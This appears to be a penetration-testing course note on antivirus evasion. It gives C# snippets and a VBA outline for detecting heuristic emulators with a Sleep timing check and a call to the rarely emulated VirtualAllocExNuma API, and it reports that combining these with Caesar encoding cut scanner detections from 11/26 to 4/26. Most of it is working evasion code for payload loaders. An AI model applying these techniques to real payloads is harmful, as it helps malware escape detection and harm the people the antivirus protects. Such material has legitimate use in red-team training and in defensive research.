# 05.03 Heuristics Bypass Sleep Timer VirtualAllocExNuma

> Section 6.6 · detect AV emulation via time-lapse and obscure APIs

## Overview

Heuristic AV emulators 'fast-forward' Sleep calls and don't emulate uncommon APIs. Use Sleep(2000) with a DateTime lapse check: if less than 1.5 seconds pass, the code is being emulated — exit early. Alternatively, call VirtualAllocExNuma (NUMA-aware allocation, rarely emulated); if it returns null, the code is in an emulator — exit. Combining Caesar cipher encoding with VirtualAllocExNuma drops AntiScan.Me detection from 11/26 to 4/26.

## Steps

- **Sleep(2000) + DateTime** — import Sleep via DllImport; record DateTime.Now before and after; if TotalSeconds < 1.5 the call was fast-forwarded — return.
- **VirtualAllocExNuma** — reuse VirtualAllocEx import + extra UInt32 nndPreferred; pass GetCurrentProcess() as hProcess.
- **Emulation check** — call with IntPtr.Zero, 0x1000, 0x3000, 0x4, 0; if return is null → emulator → return.
- **VBA port of Sleep** — Declare PtrSafe Function Sleep Lib "KERNEL32"; use DateDiff("s", t1, t2) to check elapsed seconds.

## Commands

### Sleep timer emulation detection

```csharp
...
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
     
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
...
```

### DllImport and emulation check

```csharp
// DllImport for VirtualAllocExNuma — extra nndPreferred param vs VirtualAllocEx
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,  
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

// DllImport for GetCurrentProcess — pass as hProcess to VirtualAllocExNuma
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

// If null is returned, AV emulator doesn't implement this NUMA API — exit early
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,
0);
if(mem == null)
{
    return;
}
```
